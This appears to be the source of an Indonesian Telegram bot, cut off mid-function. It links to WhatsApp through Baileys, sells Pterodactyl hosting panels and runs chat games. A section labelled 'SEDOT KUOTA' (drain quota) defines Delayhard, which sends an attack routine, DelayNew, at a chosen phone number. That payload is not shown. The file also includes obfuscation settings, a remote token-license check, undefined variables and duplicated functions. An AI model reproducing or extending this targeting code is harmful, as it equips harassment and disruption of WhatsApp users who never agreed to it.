const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const {
  tokenBot,
  ownerID,
  CHANNEL_USERNAME,
  LOG_CHAT_ID,

  domain,
  plta,
  pltc,

  domainV2,
  pltaV2,
  pltcV2,

  domainV3,
  pltaV3,
  pltcV3,

  domainV4,
  pltaV4,
  pltcV4,

  domainV5,
  pltaV5,
  pltcV5,

  domainV6,
  pltaV6,
  pltcV6,

  domainV7,
  pltaV7,
  pltcV7

} = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
    generateMessagetTag,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const JsConfuserLib = require("js-confuser");
const JsConfuser = JsConfuserLib.default || JsConfuserLib;
const baseConfig = {
  target: "node",
  preset: "high",
  compact: true,
  calculator: true,
  deadCode: 0.1,
  controlFlowFlattening: 0.75,
  stringConcealing: true,
  stringEncoding: true,
  identifierGenerator: "randomized"
};
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const cheerio = require("cheerio");
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ------ ( Link Raw Github ) ------ //
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/prantirahayu80-star/tuanfadz/refs/heads/main/token.json";

// ------ ( Pengecekan Token ) ------ //
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (Array.isArray(response.data)) {
      return response.data;
    }

    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }

    const raw = JSON.stringify(response.data || "");
    const extracted = raw.match(/\d{5,}:[A-Za-z0-9_\-]{20,}/g);

    return extracted || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔍 Memeriksa token anda"));

  let validTokens = await fetchValidTokens();

  if (!Array.isArray(validTokens)) {
    validTokens = [];
  }

  const tokenList = validTokens.map(t => String(t).trim());

  // Normalisasi token BOT lu
  const normalizedBotToken = String(tokenBot).trim();

  // cek token
  if (!tokenList.includes(normalizedBotToken)) {
    console.log(chalk.red(`
⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀
⬡═―—―――――――――――――—═⬡⠀⠀⠀
❌ Akses Telah Di Tolak ❌
Alasan : Bot Token Belum terdaftar 
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ Alhamdulillah, token valid!`));
  startBot();
}



function startBot() {
  console.log(chalk.green(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
`));
console.log(chalk.yellow(`
⬡═―—――――――――――――—═⬡⠀⠀⠀
⌑ Status Bot : Connected 
⌑ Version : 15.00 - Project
⌑ Developer : @FadzxGanteng⠀⠀
⬡═―—――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
}
validateToken();

//------------------(AWAL FUNGSI CPANEL)--------------------//
const COOLDOWN_FILE = path.join(__dirname, "db", "cooldown.json");
const CPU_CHECK_STATUS_FILE = path.join(__dirname, "db", "cekcpu.json");

const cooldowns = {};

const versions = {
  1: { domain, plta, pltc },
  2: { domain: domainV2, plta: pltaV2, pltc: pltcV2 },
  3: { domain: domainV3, plta: pltaV3, pltc: pltcV3 },
  4: { domain: domainV4, plta: pltaV4, pltc: pltcV4 },
  5: { domain: domainV5, plta: pltaV5, pltc: pltcV5 },
  6: { domain: domainV6, plta: pltaV6, pltc: pltcV6 },
  7: { domain: domainV7, plta: pltaV7, pltc: pltcV7 }
};

function ensureJsonFile(filePath, defaultData) {
  const dir = path.dirname(filePath);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

function loadCooldown() {
  ensureJsonFile(COOLDOWN_FILE, { globalCooldown: 5000 });
  return JSON.parse(fs.readFileSync(COOLDOWN_FILE, "utf8"));
}

function saveCooldown(data) {
  fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
}

function checkCooldown(ctx) {
  const db = loadCooldown();
  const userId = String(ctx.from.id);

  if (userId == ownerID) return false;

  const now = Date.now();

  if (!cooldowns[userId]) {
    cooldowns[userId] = now;
    return false;
  }

  const diff = now - cooldowns[userId];

  if (diff < db.globalCooldown) {
    const sisa = Math.ceil((db.globalCooldown - diff) / 1000);
    return `⏳ Tunggu ${sisa} detik`;
  }

  cooldowns[userId] = now;
  return false;
}

function loadJsonData(filename, defaultData = {}) {
  try {
    ensureJsonFile(filename, defaultData);
    return JSON.parse(fs.readFileSync(filename, "utf8"));
  } catch {
    return defaultData;
  }
}

function saveJsonData(filename, data) {
  fs.writeFileSync(filename, JSON.stringify(data, null, 2));
}

function sanitizeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function asHtmlBlockFromPlain(text) {
  return `<blockquote><pre>${sanitizeHtml(text)}</pre></blockquote>`;
}

function getPanelConfig(version = 1) {
  return versions[version] || null;
}

async function fetchPanel(endpoint, version = 1, method = "GET", data = null) {
  const cfg = getPanelConfig(version);

  if (!cfg || !cfg.domain || !cfg.plta) {
    throw new Error(`Config panel versi ${version} belum lengkap`);
  }

  const url = `${cfg.domain.replace(/\/$/, "")}${endpoint}`;

  const res = await axios({
    url,
    method,
    data,
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${cfg.plta}`
    }
  });

  return res.data;
}
//------------------(AKHIR FUNGSI CPANEL)--------------------//

//------------------(AWAL FUNGSI CREATE PANEL)--------------------//
function generatePanelPassword(length = 10) {
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function buildPanelSpecs(command) {
  const map = {
    "1gb":  { memory: 1024,  disk: 1024,  cpu: 40 },
    "2gb":  { memory: 2048,  disk: 2048,  cpu: 60 },
    "3gb":  { memory: 3072,  disk: 3072,  cpu: 80 },
    "4gb":  { memory: 4096,  disk: 4096,  cpu: 100 },
    "5gb":  { memory: 5120,  disk: 5120,  cpu: 120 },
    "6gb":  { memory: 6144,  disk: 6144,  cpu: 140 },
    "7gb":  { memory: 7168,  disk: 7168,  cpu: 160 },
    "8gb":  { memory: 8192,  disk: 8192,  cpu: 180 },
    "9gb":  { memory: 9216,  disk: 9216,  cpu: 200 },
    "10gb": { memory: 10240, disk: 10240, cpu: 220 },
    "unli": { memory: 0,     disk: 0,     cpu: 0 }
  };

  return map[command] || null;
}

async function createPanelUser(username, telegramInput, version = 1) {
  const cfg = getPanelConfig(version);
  if (!cfg || !cfg.domain || !cfg.plta) {
    throw new Error(`Config panel versi ${version} belum lengkap`);
  }

  const cleanInput = String(telegramInput || "")
    .replace(/^@/, "")
    .replace(/[^a-zA-Z0-9_]/g, "");

  const email = `${cleanInput || Date.now()}@panel.local`;
  const password = generatePanelPassword(10);
  const firstName = username;
  const lastName = "Panel";

  const userData = await fetchPanel("/api/application/users", version, "POST", {
    email,
    username,
    first_name: firstName,
    last_name: lastName,
    password
  });

  return {
    user: userData.attributes,
    email,
    password
  };
}

async function createPanelServer({
  username,
  userId,
  specs,
  version = 1
}) {
  const cfg = getPanelConfig(version);
  if (!cfg || !cfg.domain || !cfg.plta) {
    throw new Error(`Config panel versi ${version} belum lengkap`);
  }

  const nodesData = await fetchPanel("/api/application/nodes", version, "GET");
  const firstNode = Array.isArray(nodesData?.data) ? nodesData.data[0] : null;

  if (!firstNode) {
    throw new Error("Node panel tidak ditemukan");
  }

  const nodeId = firstNode.attributes.id;

  const allocData = await fetchPanel(
    `/api/application/nodes/${nodeId}/allocations`,
    version,
    "GET"
  );

  const allocations = Array.isArray(allocData?.data) ? allocData.data : [];
  const freeAlloc = allocations.find((a) => !a.attributes.assigned);

  if (!freeAlloc) {
    throw new Error("Allocation kosong tidak ditemukan");
  }

  const allocationId = freeAlloc.attributes.id;

  const serverData = await fetchPanel("/api/application/servers", version, "POST", {
    name: username,
    user: userId,
    egg: eggs,
    docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
    startup: "npm start",
    environment: {
      INST: "npm",
      USER_UPLOAD: "0",
      AUTO_UPDATE: "0",
      CMD_RUN: "npm start"
    },
    limits: {
      memory: specs.memory,
      swap: 0,
      disk: specs.disk,
      io: 500,
      cpu: specs.cpu
    },
    feature_limits: {
      databases: 5,
      backups: 5,
      allocations: 1
    },
    deploy: {
      locations: [loc],
      dedicated_ip: false,
      port_range: []
    },
    allocation: {
      default: allocationId
    }
  });

  return serverData.attributes;
}
//------------------(AWAL ROLES  CPANEL)--------------------//
const OWNER_USERS_FILE = path.join(__dirname, "db", "users", "ownerUsers.json");
const PARTNER_USERS_FILE = path.join(__dirname, "db", "users", "partnerUsers.json");
const RESELLER_USERS_FILE = path.join(__dirname, "db", "users", "resellerUsers.json");

function loadRoleFile(filePath) {
  return loadJsonData(filePath, []);
}

function saveRoleFile(filePath, data) {
  return saveJsonData(filePath, data);
}

function normalizeUserId(input) {
  return String(input || "").replace(/[^\d]/g, "");
}

function isMainOwner(userId) {
  return String(userId) === String(ownerID);
}

function isOwnerAccess(userId) {
  if (isMainOwner(userId)) return true;
  const owners = loadRoleFile(OWNER_USERS_FILE);
  return owners.includes(String(userId));
}

function isPartnerAccess(userId) {
  const partners = loadRoleFile(PARTNER_USERS_FILE);
  return partners.includes(String(userId));
}

function isResellerAccess(userId) {
  const resellers = loadRoleFile(RESELLER_USERS_FILE);
  return resellers.includes(String(userId));
}

function hasPanelAccess(userId) {
  return (
    isMainOwner(userId) ||
    isOwnerAccess(userId) ||
    isPartnerAccess(userId) ||
    isResellerAccess(userId)
  );
}

function addUserToRole(filePath, userId) {
  const id = normalizeUserId(userId);
  if (!id) return { ok: false, message: "ID tidak valid" };

  const users = loadRoleFile(filePath);
  if (users.includes(id)) {
    return { ok: false, message: "User sudah ada di role ini" };
  }

  users.push(id);
  saveRoleFile(filePath, users);
  return { ok: true, message: "Berhasil ditambahkan" };
}

function removeUserFromRole(filePath, userId) {
  const id = normalizeUserId(userId);
  if (!id) return { ok: false, message: "ID tidak valid" };

  const users = loadRoleFile(filePath);
  const filtered = users.filter((x) => x !== id);

  if (filtered.length === users.length) {
    return { ok: false, message: "User tidak ditemukan di role ini" };
  }

  saveRoleFile(filePath, filtered);
  return { ok: true, message: "Berhasil dihapus" };
}

function listRoleUsers(filePath) {
  return loadRoleFile(filePath);
}

function getTargetUserIdFromCommand(ctx) {
  const replyUserId = ctx.message.reply_to_message?.from?.id;
  if (replyUserId) return String(replyUserId);

  const arg = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!arg) return null;

  return normalizeUserId(arg);
}

//------------------(AKHIR FUNGSI CPANEL)--------------------//

//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

//------------------(WAJIB DI ISI YAA)--------------------//
const thumbnailUrl = "https://files.catbox.moe/4ermag.jpg";
const ThumbnailPairing = "https://files.catbox.moe/aaercl.jpg";
//-------------------------------------------------------------------------//

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(SEDOT KUOTA)--------------------//
async function Delayhard(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3700;

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 1; i++) {

    const loopStart = Date.now();

    try {
      await DelayNew(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/3  ` +
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/3  ` +
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

//------------------(PREMIUM GROUP)--------------------//
// DB file auto dibuat
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

// --- helpers db ---
function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) {
      fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    }
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch {
    return { groups: [] };
  }
}

function savePremGroups(db) {
  fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2));
}

function isPremGroup(chatId) {
  const db = loadPremGroups();
  return db.groups.includes(Number(chatId));
}

function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}

function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Khusus owner.", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

// --- middleware: premium group gate (pakai buat command premium) ---
const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  }
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, {
      parse_mode: "HTML",
    });
  }
  return next();
};

// --- html escape biar aman ---
function escapeHtml(s = "") {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ================================
// POINT SYSTEM TIC TAC TOE
// ================================
const POINTS_FILE = path.join(__dirname, "points.json");

function loadPoints() {
  try {
    if (!fs.existsSync(POINTS_FILE)) {
      fs.writeFileSync(POINTS_FILE, JSON.stringify({}, null, 2));
    }
    const raw = fs.readFileSync(POINTS_FILE, "utf8");
    return JSON.parse(raw || "{}");
  } catch {
    return {};
  }
}

function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addWinPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 3;
  db[id].win += 1;
  savePoints(db);
}

function addLosePoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addDrawPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 1;
  db[id].draw += 1;
  savePoints(db);
}

function getUserPoint(userId) {
  const db = loadPoints();
  return db[String(userId)] || null;
}

function getLeaderboard(limit = 10) {
  const db = loadPoints();
  return Object.values(db)
    .sort((a, b) => b.points - a.points)
    .slice(0, limit);
}

// ================================
// TIC TAC TOE
// ================================
const tttGames = new Map(); // chatId -> game

function tttNewBoard() {
  return Array(9).fill(null);
}

function tttWinner(board) {
  const lines = [
    [0,1,2],[3,4,5],[6,7,8],
    [0,3,6],[1,4,7],[2,5,8],
    [0,4,8],[2,4,6]
  ];

  for (const [a, b, c] of lines) {
    if (board[a] && board[a] === board[b] && board[a] === board[c]) {
      return board[a];
    }
  }
  return null;
}

function tttDraw(board) {
  return board.every(v => v !== null) && !tttWinner(board);
}

function tttCell(v) {
  if (v === "X") return "❌";
  if (v === "O") return "⭕";
  return "➖";
}

function tttSafeName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function tttBoardKeyboard(chatId, gameId, board, locked = false) {
  const btn = (i) => ({
    text: tttCell(board[i]),
    callback_data: locked
      ? `tttnoop_${chatId}_${gameId}`
      : `tttmove_${chatId}_${gameId}_${i}`
  });

  return {
    inline_keyboard: [
      [btn(0), btn(1), btn(2)],
      [btn(3), btn(4), btn(5)],
      [btn(6), btn(7), btn(8)]
    ]
  };
}

function tttRender(game) {
  const xName = game.players.X ? tttSafeName(game.players.X) : "-";
  const oName = game.players.O ? tttSafeName(game.players.O) : "-";
  const turnUser = game.turn === "X" ? game.players.X : game.players.O;
  const turnName = turnUser ? tttSafeName(turnUser) : "-";

  return `🎮 <b>TIC TAC TOE</b>

❌ X : <b>${xName}</b>
⭕ O : <b>${oName}</b>

Giliran:
<b>${game.turn}</b> - ${turnName}`;
}

// ================================
// POINT SYSTEM SUIT BATU KERTAS 
// ================================
function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addSuitWin(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 2;
  db[id].win += 1;
  savePoints(db);
}

function addSuitLose(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addSuitDraw(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].draw += 1;
  savePoints(db);
}

// ================================
// SUIT GAME
// ================================
const suitGames = new Map(); // chatId -> game

function suitName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function suitChoiceLabel(choice) {
